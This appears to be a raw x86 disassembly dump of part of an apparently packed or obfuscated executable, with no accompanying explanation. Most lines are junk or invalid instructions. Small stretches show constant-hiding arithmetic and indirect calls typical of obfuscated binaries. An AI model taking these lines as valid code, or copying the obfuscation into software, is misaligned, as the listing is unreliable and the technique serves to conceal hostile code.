  405897:	jne    0x405899
  405899:	fld    QWORD PTR [edi-0x3ad39ba3]
  40589f:	push   0xef02c12
  4058a4:	std    
  4058a5:	cmp    ebx,ecx
  4058a7:	push   esi
  4058a8:	cmp    edx,DWORD PTR [ebx+0x38d2a334]
  4058ae:	aaa    
  4058af:	push   ecx
  4058b0:	jnp    0x40587a
  4058b2:	pop    edi
  4058b3:	mov    eax,0x37660646
  4058b8:	dec    DWORD PTR [edi+0x662543ba]
  4058be:	mov    cl,0xd3
  4058c0:	adc    DWORD PTR [edx-0xa],edi
  4058c3:	xor    eax,0x11a14c84
  4058c8:	mov    ?,edx
  4058ca:	pop    ebx
  4058cb:	and    al,0xa1
  4058cd:	inc    ebx
  4058ce:	sub    dl,BYTE PTR [eax+0x4b]
  4058d1:	fistp  DWORD PTR [edi-0x45b85fa4]
  4058d7:	push   0xffffffeb
  4058d9:	sbb    eax,eax
  4058db:	mov    ecx,0x3cc366d1
  4058e0:	xor    DWORD PTR [ebp+0x19],edx
  4058e3:	pushf  
  4058e4:	jmp    0x4058cc
  4058e6:	jb     0x4058a5
  4058e8:	adc    al,BYTE PTR [esi+esi*4+0x433ff0d]
  4058ef:	adc    eax,0x1ccf9ce4
  4058f4:	in     al,0x74
  4058f6:	cwde   
  4058f7:	icebp  
  4058f8:	shl    dh,0x98
  4058fb:	gs dec ebx
  4058fd:	mov    edx,0xffae3f74
  405902:	push   ecx
  405903:	mov    bl,0x17
  405905:	dec    edx
  405906:	or     dl,BYTE PTR [edi]
  405908:	fcomp  QWORD PTR [ebx-0x2f8fc256]
  40590e:	stc    
  40590f:	xor    eax,0xa8c21e05
  405914:	add    BYTE PTR ds:0xd3295148,cl
  40591a:	push   ss
  40591b:	cmp    ebp,DWORD PTR [ebx+eax*8-0x4a]
  40591f:	push   ss
  405920:	in     eax,0x4a
  405922:	aad    0xfb
  405924:	jb     0x4058b0
  405926:	retf   0x77a4
  405929:	popa   
  40592a:	or     eax,0x6b785672
  40592f:	test   al,0x16
  405931:	loope  0x40592a
  405933:	popa   
  405934:	inc    esp
  405935:	out    0x88,al
  405937:	mov    WORD PTR [esi],?
  405939:	xlat   BYTE PTR ds:[ebx]
  40593a:	pop    ebp
  40593b:	dec    ecx
  40593c:	sub    edi,DWORD PTR [edi-0x3ac44360]
  405942:	pushf  
  405943:	mov    esi,0xd028209e
  405948:	jle    0x405992
  40594a:	int3   
  40594b:	imul   ebp,ebx,0xffffffa7
  40594e:	cdq    
  40594f:	(bad)  
  405950:	pop    eax
  405951:	mov    cs,WORD PTR [eax]
  405953:	sub    BYTE PTR [edi-0x41db45b2],cl
  405959:	cmc    
  40595a:	inc    esi
  40595b:	lock pusha 
  40595d:	int    0x55
  40595f:	fwait
  405960:	or     BYTE PTR [ecx-0x51bf4d16],0x17
  405967:	cli    
  405968:	call   0x6fb1bff
  40596d:	add    ebp,eax
  40596f:	mov    ds:0x36e49c8a,eax
  405974:	sbb    cl,BYTE PTR [ebp+0x7cea9ab]
  40597a:	mov    edi,0xdc48d294
  40597f:	loope  0x4059eb
  405981:	loop   0x4059b7
  405983:	add    BYTE PTR [edi],ch
  405985:	mov    ecx,0xa5240844
  40598a:	femms  
  40598c:	in     eax,0xbc
  40598e:	mov    ebx,0xc48051a7
  405993:	xchg   ebp,eax
  405994:	popa   
  405995:	inc    ecx
  405996:	pop    edi
  405997:	sub    dl,cl
  405999:	lods   eax,DWORD PTR ds:[esi]
  40599a:	out    dx,eax
  40599b:	push   sp
  40599d:	out    0x5a,al
  40599f:	jge    0x4059a7
  4059a1:	rcr    BYTE PTR [esi],0xa2
  4059a4:	test   eax,0x4d511553
  4059a9:	pop    ebp
  4059aa:	jmp    0x4059ef
  4059ac:	repnz cmp ch,bh
  4059af:	shl    DWORD PTR [ebx-0x62],0x10
  4059b3:	mov    ds:0x540f8c56,eax
  4059b8:	sbb    eax,0x51af850e
  4059bd:	sbb    al,0xa1
  4059bf:	xchg   esi,eax
  4059c0:	rcl    DWORD PTR [eax+0x4],0xc3
  4059c4:	(bad)  
  4059c5:	dec    edx
  4059c6:	or     eax,0x34757997
  4059cb:	push   cs
  4059cc:	retf   0xc64c
  4059cf:	lods   eax,DWORD PTR ds:[esi]
  4059d0:	pop    esi
  4059d1:	fisttp DWORD PTR [esi-0x3e74b099]
  4059d7:	mov    edx,0xee5fcd9c
  4059dc:	(bad)  
  4059de:	dec    esi
  4059df:	mov    ds:0x1e2396e4,al
  4059e4:	or     DWORD PTR [ebx],0xffffff81
  4059e7:	push   0x6e
  4059e9:	jecxz  0x405a1b
  4059eb:	mul    DWORD PTR [eax+0x2b36f4ee]
  4059f1:	leave  
  4059f2:	clc    
  4059f3:	pop    ebp
  4059f4:	push   es
  4059f5:	cdq    
  4059f6:	mov    eax,ds:0x4803a112
  4059fb:	push   ecx
  4059fc:	inc    ebp
  4059fd:	cmp    al,0x60
  4059ff:	cmp    eax,0xdd73c814
  405a04:	xor    BYTE PTR [edx],0x85
  405a07:	xchg   BYTE PTR [esi],al
  405a09:	xchg   esi,eax
  405a0a:	pusha  
  405a0b:	and    DWORD PTR [ecx+0xe],0xffffffac
  405a0f:	out    dx,eax
  405a10:	fld    QWORD PTR gs:[eax-0x7f8cd28b]
  405a18:	add    dh,BYTE PTR ds:0xdded03e
  405a1e:	test   DWORD PTR [esi+ebx*4],esp
  405a21:	loopne 0x405a81
  405a23:	daa    
  405a24:	aam    0xe7
  405a26:	fadd   DWORD PTR ds:0x83f294dd
  405a2c:	jmp    0x77aa:0x76390049
  405a33:	mov    DWORD PTR [esp+edi*4],edx
  405a36:	outs   dx,BYTE PTR ds:[esi]
  405a37:	or     DWORD PTR ds:0x50af3714,esp
  405a3d:	inc    edx
  405a3e:	repz shl edi,0x1f
  405a42:	inc    edi
  405a43:	out    0x55,al
  405a45:	dec    ebp
  405a46:	inc    ebx
  405a47:	jl     0x4059cb
  405a49:	xchg   ebp,eax
  405a4a:	mov    al,0x2d
  405a4c:	leave  
  405a4d:	lds    ebp,FWORD PTR [edi+0x2f]
  405a50:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  405a57:	and    edx,0x797b
  405a5d:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  405a64:	and    edx,edx
  405a66:	mov    eax,DWORD PTR [ebp-0x4]
  405a69:	sbb    ecx,DWORD PTR ds:0x42fe05
  405a6f:	push   esi
  405a70:	mov    esi,DWORD PTR [ebp-0x8]
  405a73:	and    DWORD PTR ds:0x42fdf1,0x0
  405a7d:	jmp    0x405a8f
  405a82:	mov    edx,DWORD PTR ds:0x42fdf1
  405a88:	inc    edx
  405a89:	mov    DWORD PTR ds:0x42fdf1,edx
  405a8f:	cmp    DWORD PTR ds:0x42fdf1,0x17
  405a96:	jae    0x405b0b
  405a9c:	cmp    DWORD PTR ds:0x42fdf1,0x1d
  405aa3:	jne    0x405ab5
  405aa9:	push   DWORD PTR [ebp-0x24]
  405aac:	push   DWORD PTR [ebp-0x20]
  405aaf:	call   DWORD PTR ds:0x42e3db
  405ab5:	jmp    0x405a82
  405aba:	mov    DWORD PTR ds:0x42fdd9,0x14
  405ac4:	cmp    DWORD PTR ds:0x42fdd9,0x0
  405acb:	je     0x405b0b
  405ad1:	cmp    DWORD PTR ds:0x42fdd9,0x16
  405ad8:	jne    0x405af7
  405ade:	push   DWORD PTR [ebp-0x14]
  405ae1:	push   0x2e3f
  405ae6:	push   DWORD PTR [ebp-0x18]
  405ae9:	push   DWORD PTR [ebp-0x18]
  405aec:	push   0x8cdb
  405af1:	call   DWORD PTR ds:0x42e637
  405af7:	xor    edx,edx
  405af9:	xor    edx,DWORD PTR ds:0x42fdd9
  405aff:	dec    edx
  405b00:	mov    DWORD PTR ds:0x42fdd9,edx
  405b06:	jmp    0x405ac4
  405b0b:	mov    edx,0x7510855
  405b10:	add    DWORD PTR ds:0x42fdd1,edi
  405b16:	xor    eax,edx
  405b18:	and    DWORD PTR ds:0x42e7f7,ebx
  405b1e:	xor    esi,edx
  405b20:	mov    ecx,0x32729c
  405b25:	add    esi,ecx
  405b27:	add    eax,ecx
  405b29:	imul   eax,esi
  405b2c:	mov    esi,DWORD PTR [ebp+0xc]
  405b2f:	cmp    esi,eax
  405b31:	jne    0x405b4d
  405b37:	mov    eax,DWORD PTR [ebp-0x4]
  405b3a:	mov    esi,DWORD PTR [ebp-0x8]
  405b3d:	xor    eax,edx
  405b3f:	xor    esi,edx
  405b41:	add    eax,ecx
  405b43:	add    esi,ecx
  405b45:	imul   eax,esi
  405b48:	jmp    0x405e5b
  405b4d:	mov    eax,DWORD PTR [ebp+0xc]
  405b50:	mov    eax,DWORD PTR [eax+0x78]
  405b53:	mov    DWORD PTR [ebp+0xc],eax
  405b56:	mov    eax,DWORD PTR [ebp-0x4]
  405b59:	mov    esi,DWORD PTR [ebp-0x8]
  405b5c:	xor    eax,edx
  405b5e:	xor    esi,edx
  405b60:	add    eax,ecx
  405b62:	add    esi,ecx
  405b64:	imul   eax,esi
  405b67:	mov    esi,DWORD PTR [ebp+0xc]
  405b6a:	cmp    esi,eax
  405b6c:	mov    eax,DWORD PTR [ebp-0x4]
  405b6f:	je     0x405b3a
  405b75:	jmp    0x405e48
  405b7a:	xchg   DWORD PTR [ebx-0xdac0d75],edi
  405b80:	imul   esi,DWORD PTR gs:[eax+0x3],0x8b89624d
  405b88:	pop    es
  405b89:	mov    edx,0x70703284
  405b8e:	stos   BYTE PTR es:[edi],al
  405b8f:	jle    0x405c01
  405b91:	jo     0x405b9a
  405b93:	push   esi
  405b94:	std    
  405b95:	enter  0xe98a,0x57
  405b99:	xor    ebx,DWORD PTR [esi+eiz*4]
  405b9c:	fwait
  405b9d:	sub    cl,BYTE PTR ds:0x87ec74c5
  405ba3:	pop    es
  405ba4:	push   0xfffffff7
  405ba6:	xchg   DWORD PTR [ebx],ecx
  405ba8:	adc    bl,BYTE PTR [ebx-0x10]
  405bab:	pop    esp
  405bac:	push   edx
  405bad:	jmp    0x2acc369d
  405bb2:	out    0xcf,eax
  405bb4:	sub    al,0x50
  405bb6:	cmp    al,0xf0
  405bb8:	jo     0x405b9c
  405bba:	mov    edx,0x659250bd
  405bbf:	rcr    edx,1
  405bc1:	add    ah,BYTE PTR ds:0xe4236de3
  405bc7:	ret    0x19c
  405bca:	xor    edi,DWORD PTR ds:[esi+ecx*1+0x1c]
  405bcf:	add    edi,DWORD PTR [edx-0x63]
  405bd2:	cmp    eax,0xf3b439c6
  405bd7:	or     ebp,DWORD PTR [ebx]
  405bd9:	sbb    eax,0x4b4c7442
  405bde:	mov    ds:0xf9457da7,al
  405be3:	shr    eax,1
  405be5:	push   ds
  405be6:	pop    ss
  405be7:	stos   DWORD PTR es:[edi],eax
  405be8:	lock ins DWORD PTR es:[edi],dx
  405bea:	enter  0xe15b,0x64
  405bee:	mov    ebx,0x23db4d69
  405bf3:	push   ss
  405bf4:	pop    eax
  405bf5:	sbb    BYTE PTR [ebx-0x4c1ea565],0x5f
  405bfc:	inc    eax
  405bfd:	cmp    ecx,DWORD PTR [edx+0x56]
  405c00:	leave  
  405c01:	add    eax,0x2ee7ee15
  405c06:	push   ds
  405c07:	ja     0x405bcb
  405c09:	pop    eax
  405c0a:	(bad)  
  405c0b:	mov    cl,0xdc
  405c0d:	adc    BYTE PTR [edx],bl
  405c0f:	sub    al,0x9e
  405c11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c12:	xchg   BYTE PTR [esi+0x11],dh
  405c15:	pop    ecx
  405c16:	mov    edi,0x8b7caba6
  405c1b:	fdivr  QWORD PTR [edi-0x19e91284]
  405c21:	sbb    al,0xa7
  405c23:	fs push esi
  405c25:	outs   dx,DWORD PTR ds:[esi]
  405c26:	aas    
  405c27:	mov    BYTE PTR [ebp+edi*1+0x36],dh
  405c2b:	push   esp
  405c2c:	mov    DWORD PTR [eax+0x5c8c9c21],0xe45f659a
  405c36:	retf   
  405c37:	or     al,0x3e
  405c39:	and    al,0x98
  405c3b:	sub    eax,0x254cf554
  405c40:	dec    ecx
  405c41:	xchg   BYTE PTR [ecx+eiz*1],cl
  405c44:	inc    ebp
  405c45:	xor    bh,ch
  405c47:	cwde   
  405c48:	push   es
  405c49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c4a:	cs stc 
  405c4c:	hlt    
  405c4d:	xor    al,BYTE PTR [edi+edi*1-0x5d]
  405c51:	inc    edx
  405c52:	jmp    0xed1d31da
  405c57:	mov    esi,0xffbdeff7
  405c5c:	xlat   BYTE PTR ds:[ebx]
  405c5d:	imul   esi,DWORD PTR [eax+0x67],0xffffffcc
  405c61:	xchg   edx,eax
  405c62:	push   0x783f5927
  405c67:	outs   dx,DWORD PTR ds:[esi]
  405c68:	into   
  405c69:	sub    edx,esi
  405c6b:	mov    WORD PTR [ebx-0x47],gs
  405c6e:	mov    ch,BYTE PTR [esp+0x25257b7e]
  405c75:	cmp    eax,0x57b684e7
  405c7a:	xchg   DWORD PTR [edx-0x3a],edi
  405c7d:	pop    edi
  405c7e:	dec    ebp
  405c7f:	(bad)  
  405c80:	in     al,dx
  405c81:	jl     0x405c84
  405c83:	call   0x2214:0xab61963
  405c8a:	push   es
  405c8b:	mov    ebp,0x3ccc2a91
  405c90:	cmp    BYTE PTR [eax],bh
  405c92:	rol    ebx,1
  405c94:	add    al,0x8e
  405c96:	pop    ds
  405c97:	repnz fidivr WORD PTR [eax]
  405c9a:	push   0x32090db2
  405c9f:	cmp    al,0x5
  405ca1:	xor    dl,BYTE PTR [ebx-0x423615f6]
  405ca7:	pop    ecx
  405ca8:	push   ebp
  405ca9:	lods   eax,DWORD PTR ds:[esi]
  405caa:	lds    edx,FWORD PTR [ebx-0x72]
  405cad:	add    cl,al
  405caf:	sahf   
  405cb0:	mov    esp,0xea2139fd
  405cb5:	test   al,0xba
  405cb7:	mov    ebx,0x73ac7bae
  405cbc:	push   edx
  405cbd:	js     0x405cbf
  405cbf:	add    eax,0x709f85d7
  405cc4:	pop    ecx
  405cc5:	cdq    
  405cc6:	adc    ebp,DWORD PTR ds:0xfdab8c21
  405ccc:	retf   
  405ccd:	aam    0x9b
  405ccf:	dec    edx
  405cd0:	inc    esi
  405cd1:	cs fucom st(4)
  405cd4:	jle    0x405cdd
  405cd6:	stc    
  405cd7:	add    al,0x1b
  405cd9:	cmp    ebp,DWORD PTR [esi]
  405cdb:	push   esi
  405cdc:	retf   0x8240
  405cdf:	mov    eax,ds:0x5be62bd9
  405ce4:	out    0x31,al
  405ce6:	mov    al,0xec
  405ce8:	sbb    cl,BYTE PTR [edi]
  405cea:	or     ah,bl
  405cec:	or     eax,edx
  405cee:	arpl   WORD PTR [esi-0x12d4a54d],cx
  405cf4:	int3   
  405cf5:	xor    eax,0x5438bb6b
  405cfa:	cs test eax,0xafa95c08
  405d00:	mov    al,ds:0xc19db04
  405d05:	out    dx,al
  405d06:	inc    ebp
  405d07:	push   esi
  405d08:	cmp    edx,DWORD PTR [eax+0x1e]
  405d0b:	pop    edi
  405d0c:	mov    ebp,0x89a15235
  405d11:	lgs    esi,FWORD PTR [eax]
  405d14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d15:	test   DWORD PTR [ecx+0x218a8060],edi
  405d1b:	hlt    
  405d1c:	sbb    al,BYTE PTR [ebx]
  405d1e:	dec    edi
  405d1f:	int3   
  405d20:	rcr    BYTE PTR [ecx-0x18],0xdd
  405d24:	or     ecx,DWORD PTR [esi-0x23]
  405d27:	lea    ebx,[edi+0x30b042ff]
  405d2d:	push   edx
  405d2e:	mov    WORD PTR [ebp-0xa],ss
  405d31:	sbb    DWORD PTR [ebp-0x437c5321],ecx
  405d37:	outs   dx,DWORD PTR ds:[esi]
  405d38:	(bad)  
  405d39:	pop    edx
  405d3a:	cmp    eax,eax
  405d3c:	lock test BYTE PTR [eax+0x60],0x43
  405d41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d42:	addr16 sub eax,0xf8a8c80
  405d48:	sub    BYTE PTR es:[ebp+0x1b2f5fe3],bh
  405d4f:	push   edx
  405d50:	and    al,0xe3
  405d52:	adc    al,0xe4
  405d54:	scas   al,BYTE PTR es:[edi]
  405d55:	push   edx
  405d56:	adc    DWORD PTR [ecx],0xbda1fdc0
  405d5c:	pop    ss
  405d5d:	inc    esp
  405d5e:	ja     0x405d90
  405d60:	mov    esp,eax
  405d62:	and    eax,0xc511caed
  405d67:	pushf  
  405d68:	sbb    al,0x32
  405d6a:	fnstcw WORD PTR [ecx]
  405d6c:	fsub   QWORD PTR [ecx-0x71]
  405d6f:	outs   dx,DWORD PTR ds:[esi]
  405d70:	pop    ds
  405d71:	aam    0x43
  405d73:	jecxz  0x405d72
  405d75:	cdq    
  405d76:	jecxz  0x405d24
  405d78:	adc    BYTE PTR [eax],al
  405d7a:	es push esp
  405d7c:	mov    bh,0x24
  405d7e:	push   0x51
  405d80:	clc    
  405d81:	loope  0x405d8e
  405d83:	xchg   DWORD PTR [ebp+0x448a843a],esp
  405d89:	call   DWORD PTR [ecx+0x42e7e26]
  405d8f:	mov    WORD PTR [esi-0x6f],?
  405d92:	mov    bl,0x19
  405d94:	mov    esp,0xb73ce3e9
  405d99:	adc    eax,0x3c82bba
  405d9e:	inc    ecx
  405d9f:	retf   0x5c6
  405da2:	push   0xffffffd0
  405da4:	mov    dh,0xc5
  405da6:	and    dl,bl
  405da8:	in     eax,0x14
  405daa:	cmp    ecx,DWORD PTR [edi+0x9062511]
  405db0:	je     0x405de5
  405db2:	and    DWORD PTR [ebp+0x40171831],ebx
  405db8:	inc    edi
  405db9:	dec    ebp
  405dba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405dbb:	and    BYTE PTR [ebx],bh
  405dbd:	pop    esp
  405dbe:	fcmovne st,st(3)
  405dc0:	jp     0x405e3a
  405dc2:	xor    eax,0xcbd40391
  405dc7:	xchg   ebx,eax
  405dc8:	hlt    
  405dc9:	in     eax,dx
  405dca:	int    0xfb
  405dcc:	mov    ds:0x4814c3de,eax
  405dd1:	repz pop edi
  405dd3:	cmp    ch,BYTE PTR [edi-0x673091a0]
  405dd9:	aas    
  405dda:	mov    esp,0x3a4ae9fb
  405ddf:	outs   dx,DWORD PTR ds:[esi]
  405de0:	es js  0x405df2
  405de3:	or     dl,ah
  405de5:	inc    esi
  405de6:	dec    eax
  405de7:	mov    edi,0xe116889d
  405dec:	and    ebp,DWORD PTR [ecx+0xa]
  405def:	pusha  
  405df0:	les    edx,FWORD PTR [edx+edi*1-0x5d329d1d]
  405df7:	mov    bh,0xa8
  405dfa:	sub    al,0xfa
  405dfc:	loope  0x405e39
  405dfe:	adc    BYTE PTR ds:0x96258e67,ah
  405e04:	adc    BYTE PTR [ecx],ah
  405e06:	mov    edx,0x76b332ca
  405e0b:	ins    DWORD PTR es:[edi],dx
  405e0c:	add    al,0xf0
  405e0e:	daa    
  405e0f:	push   0x83c910f5
  405e14:	in     al,dx
  405e15:	push   edi
  405e16:	push   ecx
  405e17:	stos   BYTE PTR es:[edi],al
  405e18:	adc    al,0xf5
  405e1a:	int    0xa3
  405e1c:	fwait
  405e1d:	xor    al,0xe5
  405e1f:	jnp    0x405e76
  405e21:	sbb    DWORD PTR [edx+0x16],ecx
  405e24:	xor    DWORD PTR [edi-0x9],ebp
  405e27:	(bad)  
  405e29:	pop    esp
  405e2a:	push   0x5d81231c
  405e2f:	es ds xchg edx,eax
  405e32:	pop    ecx
  405e33:	mov    al,ds:0xcae6c04
  405e38:	fstp   DWORD PTR [edx-0x4]
  405e3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e3c:	push   ecx
  405e3d:	jg     0x405ead
  405e3f:	sub    esi,DWORD PTR [esi]
  405e41:	call   0x5873:0x91763f76
  405e48:	xor    eax,edx
  405e4a:	add    eax,ecx
  405e4c:	mov    ecx,DWORD PTR [ebp+0xc]
  405e4f:	imul   eax,ecx
  405e52:	add    eax,DWORD PTR [ebp+0x8]
  405e55:	mov    DWORD PTR [ebp+0xc],eax
  405e58:	mov    eax,DWORD PTR [ebp+0xc]
  405e5b:	pop    esi
  405e5c:	leave  
  405e5d:	ret    0x8
  405e60:	push   ebp
  405e61:	mov    ebp,esp
  405e63:	push   ecx
  405e64:	add    DWORD PTR ds:0x42e80f,0x1508
  405e6e:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  405e75:	mov    eax,DWORD PTR [ebp-0x4]
  405e78:	mov    edx,DWORD PTR [ebp+0x10]
  405e7b:	adc    DWORD PTR ds:0x42e7ef,0x4006
  405e85:	mov    ecx,0x7510855
  405e8a:	xor    DWORD PTR ds:0x42fe01,0x260
  405e94:	xor    eax,ecx
  405e96:	jmp    0x40605c
  405e9b:	fidiv  DWORD PTR [edx+0x7b]
  405e9e:	jle    0x405e33
  405ea0:	jne    0x405e7b
  405ea2:	jb     0x405e2d
  405ea4:	(bad)  
  405ea5:	(bad)  
  405ea6:	sub    al,0xb3
  405ea8:	and    ch,BYTE PTR [edi+0x703f3ea1]
  405eae:	jo     0x405e57
  405eb0:	jg     0x405f22
  405eb2:	jo     0x405eca
  405eb4:	or     ecx,esp
  405eb6:	shl    BYTE PTR [ebp+0x3a],cl
  405eb9:	shl    esp,cl
  405ebb:	gs scas eax,DWORD PTR es:[edi]
  405ebd:	pop    esp
  405ebe:	repz jbe 0x405eba
  405ec1:	out    dx,al
  405ec2:	jmp    0xa09558fe
  405ec7:	dec    edi
  405ec8:	sbb    eax,0xaa0936f0
  405ecd:	adc    eax,0xcc7a8558
  405ed2:	xchg   DWORD PTR [ebx+0x1],edi
  405ed5:	fwait
  405ed6:	inc    esi
  405ed7:	and    eax,0x427c7897
  405edc:	inc    eax
  405edd:	mov    eax,ds:0xf3549cb8
  405ee2:	sbb    eax,0x70362f34
  405ee7:	test   DWORD PTR [edi-0x5b],0xc9124bda
  405eee:	mov    eax,ds:0x34c9e9c9
  405ef3:	xor    eax,0xe2afe73a
  405ef8:	call   0xb57a:0x9d8e89d6
  405eff:	nop
  405f00:	leave  
  405f01:	push   edx
  405f02:	push   ds
  405f03:	adc    DWORD PTR [esi+0xd6deac7],ecx
  405f09:	and    edi,eax
  405f0b:	adc    DWORD PTR [eax-0x7a],0xffffffdc
  405f0f:	(bad)  
  405f10:	clc    
  405f11:	cmp    eax,0x2b545383
  405f16:	in     eax,0x8d
  405f18:	jns    0x405eac
  405f1a:	(bad)  
  405f1b:	loop   0x405f4d
  405f1d:	je     0x405f02
  405f1f:	jns    0x405ea4
  405f21:	inc    ebx
  405f22:	pop    esp
  405f23:	fsubr  st,st(0)
  405f25:	(bad)
  405f28:	paddd  mm2,mm1
  405f2b:	jnp    0x405fa2
  405f2d:	test   BYTE PTR [ebp-0x20],ch
  405f30:	popa   
  405f31:	mov    WORD PTR [edx+0x5b],ss
  405f34:	into   
  405f35:	sbb    esp,DWORD PTR [edx-0x49af9a95]
  405f3b:	inc    ebx
  405f3c:	jge    0x405f3a
  405f3e:	test   DWORD PTR [esi-0x63],esp
  405f41:	mov    bh,0xf6
  405f43:	ss into 
  405f45:	mov    ebp,0xeba3f47d
  405f4a:	es jp  0x405f07
  405f4d:	fwait
  405f4e:	(bad)  
  405f4f:	xchg   esp,eax
  405f50:	or     eax,0xc42a05e6
  405f55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f57:	int3   
  405f58:	xor    DWORD PTR [esp+eiz*8+0x257d870f],ecx
  405f5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f60:	dec    esi
  405f61:	push   0xffffffe5
  405f63:	fwait
  405f64:	addr16 call 0x4394e9be
  405f6a:	push   ebx
  405f6b:	mov    eax,ds:0xfa938334
  405f70:	jle    0x405fef
  405f72:	repz push 0x6c5d1aff
  405f78:	mov    edi,edi
  405f7a:	sahf   
  405f7b:	das    
  405f7c:	push   ss
  405f7d:	xchg   esi,eax
  405f7e:	pop    es
  405f7f:	xchg   ecx,eax
  405f80:	mov    al,0x53
  405f82:	sbb    edi,DWORD PTR [ebp+0x7ddfd197]
  405f88:	cmp    eax,0xab5d796c
  405f8d:	sbb    al,BYTE PTR [ebx+eiz*2+0x1931b636]
  405f94:	fwait
  405f95:	and    BYTE PTR [ebx-0x23a21da6],0xfc
  405f9c:	ret    0xff3f
  405f9f:	mov    ah,BYTE PTR [ecx+0x5f3b9532]
  405fa5:	jp     0x406018
  405fa7:	push   eax
  405fa8:	mov    eax,0xf27a5f9e
  405fad:	mov    ecx,0xa74acc5d
  405fb2:	sbb    ch,dl
  405fb4:	sub    ah,dl
  405fb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405fb7:	sbb    eax,0xdb3aada3
  405fbc:	cmp    edx,DWORD PTR [ecx]
  405fbe:	out    dx,al
  405fbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405fc0:	cmp    DWORD PTR [ebp-0x764aec79],ecx
  405fc6:	jo     0x405fed
  405fc8:	dec    edi
  405fc9:	mov    esp,DWORD PTR [edi-0x2fff2ba9]
  405fcf:	pop    eax
  405fd0:	or     eax,0xda11b799
  405fd5:	xor    BYTE PTR [edi-0x50dce06c],bl
  405fdb:	xchg   esp,eax
  405fdc:	pop    eax
  405fdd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405fde:	sub    esp,ebx
  405fe0:	cmp    BYTE PTR [esi-0x14],0xdd
  405fe4:	push   eax
  405fe5:	(bad)
  405fe8:	push   ebx
  405fe9:	mov    eax,ds:0xc5486936
  405fee:	and    eax,DWORD PTR [eax]
  405ff0:	(bad)  [esi+0x4325a626]
  405ff6:	(bad)  
  405ff7:	call   FWORD PTR [ecx+0x19402d30]
  405ffd:	mov    dh,0x45
  405fff:	mov    esi,0x11080154
  406004:	mov    edx,0xdf98da94
  406009:	xor    al,0xd5
  40600b:	push   ecx
  40600c:	outs   dx,DWORD PTR ds:[esi]
  40600d:	dec    ebx
  40600e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40600f:	repz sbb al,0xa7
  406012:	and    BYTE PTR [edi],0xf9
  406015:	pop    ecx
  406016:	stc    
  406017:	xchg   BYTE PTR [eax+eiz*8],cl
  40601a:	add    DWORD PTR ds:0xf36930d9,edi
  406020:	mov    cs,WORD PTR [edi+0x5ad40ab8]
  406026:	into   
  406027:	adc    edx,ecx
  406029:	cli    
  40602a:	test   al,0x30
  40602c:	jge    0x405fc9
  40602e:	ss (bad) 
  406030:	jmp    0x406025
  406032:	sar    BYTE PTR [edi+0x1c451f0d],cl
  406038:	sub    DWORD PTR [edi-0x6a],edx
  40603b:	xchg   BYTE PTR [esi-0x2dbf5bc2],dl
  406041:	inc    ebx
  406042:	cwde   
  406043:	shr    ch,0x6a
  406046:	adc    dl,BYTE PTR [ebx-0x5c73cf10]
  40604c:	jl     0x40607e
  40604e:	test   DWORD PTR [ebp+0x30],esi
  406051:	stos   BYTE PTR es:[edi],al
  406052:	test   eax,0x5e74b32f
  406057:	arpl   WORD PTR [esi+0x2a],sp
  40605a:	into   
  40605b:	jp     0x406062
  40605d:	pushf  
  40605e:	jb     0x406092
  406060:	add    BYTE PTR [ecx+0x42fe860d],al
  406066:	add    ah,ah
  406068:	or     al,BYTE PTR [eax]
  40606a:	add    BYTE PTR [ecx+0xc458b02],cl
  406070:	xor    eax,ecx
  406072:	push   esi
  406073:	sbb    edx,DWORD PTR ds:0x42e218
  406079:	mov    esi,DWORD PTR [ebp+0x10]
  40607c:	or     DWORD PTR ds:0x42fe76,edx
  406082:	mov    edx,0x32729c
  406087:	sbb    DWORD PTR ds:0x42fdf1,0x42e21c
  406091:	add    eax,edx
  406093:	adc    DWORD PTR ds:0x42fdd1,0x42e7fb
  40609d:	mov    DWORD PTR [esi+0x4],eax
  4060a0:	sbb    eax,0x6979
  4060a5:	mov    eax,DWORD PTR [ebp+0x14]
  4060a8:	adc    DWORD PTR ds:0x42fe82,0x2335
  4060b2:	mov    esi,DWORD PTR [ebp+0x10]
  4060b5:	sub    DWORD PTR ds:0x42fdd5,0x1c02
  4060bf:	mov    DWORD PTR [esi+0x8],eax
  4060c2:	or     eax,DWORD PTR ds:0x42fe05
  4060c8:	jmp    0x40628e
  4060cd:	out    dx,al
  4060ce:	hlt    
  4060cf:	arpl   WORD PTR [edx],dx
  4060d1:	popa   
  4060d2:	xchg   ecx,eax
  4060d3:	ins    DWORD PTR es:[edi],dx
  4060d4:	hlt    
  4060d5:	(bad)  
  4060d6:	pop    esp
  4060d7:	xor    eax,0xecb84996
  4060dc:	or     eax,0x70703e65
  4060e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060e2:	jg     0x406154
  4060e4:	jo     0x406117
  4060e6:	pusha  
  4060e7:	and    DWORD PTR [eax],ebx
  4060e9:	mov    edi,0xd8fdc9ce
  4060ee:	inc    ebx
  4060ef:	aad    0xc2
  4060f1:	ror    DWORD PTR [edx],1
  4060f3:	mov    edi,0x5780cd55
  4060f8:	push   0x2eb1a2f6
  4060fd:	dec    DWORD PTR [edx+0x58438311]
  406103:	sub    al,0xed
  406105:	sub    edx,DWORD PTR [edi+0x23a3113b]
  40610b:	lock xchg esi,eax
  40610d:	push   0xf077c597
  406112:	lock frstor [edi-0x33222660]
  406119:	cmp    BYTE PTR [esi+0x3f],0x5f
  40611d:	lea    esp,[ecx+0x8]
  406120:	fisttp DWORD PTR [ebp-0x6380fe06]
  406126:	pop    ecx
  406127:	dec    edi
  406128:	lea    esp,[ebp+0x7c]
  40612b:	pop    esi
  40612c:	mov    BYTE PTR [esi+eax*1],dh
  40612f:	push   esi
  406130:	(bad)  
  406131:	cwde   
